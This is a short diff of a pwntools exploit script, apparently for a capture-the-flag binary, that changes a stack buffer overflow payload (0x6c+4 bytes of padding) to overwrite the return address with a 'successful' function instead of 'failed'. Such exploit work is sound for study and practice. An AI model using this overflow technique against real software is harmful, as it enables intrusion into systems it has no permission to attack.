@@ -11,8 +11,7 @@ p.sendlineafter(" : ", "aaaa")
 p.sendlineafter(" : ", "bbbb")
 
 payload = "a"*(0x6c+4)
-#payload += "\x3b\x86\x04\x08" # "\x3b\x86\x04\x08" = p32(successful)
-payload += p32(failed)
+payload += p32(successful)
 
 p.sendafter("nicname\n", payload)
 
